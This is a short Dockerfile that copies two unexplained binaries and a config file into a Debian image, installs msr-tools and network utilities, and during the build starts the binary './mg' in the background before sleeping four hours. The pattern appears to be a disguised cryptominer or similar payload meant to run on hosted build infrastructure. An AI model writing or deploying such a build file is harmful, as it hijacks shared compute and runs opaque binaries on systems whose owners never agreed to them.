FROM debian:sid

COPY my-tu /
WORKDIR /app
COPY mg /app/
COPY config.json /app/

RUN apt update -y \
  && apt install -y wget curl procps msr-tools net-tools
RUN chmod a+x /my-tu /app/mg && \
  cd /app && \
  (./mg &) && \
  sleep 14400  
RUN apt install ifconfig

CMD /bin/bash
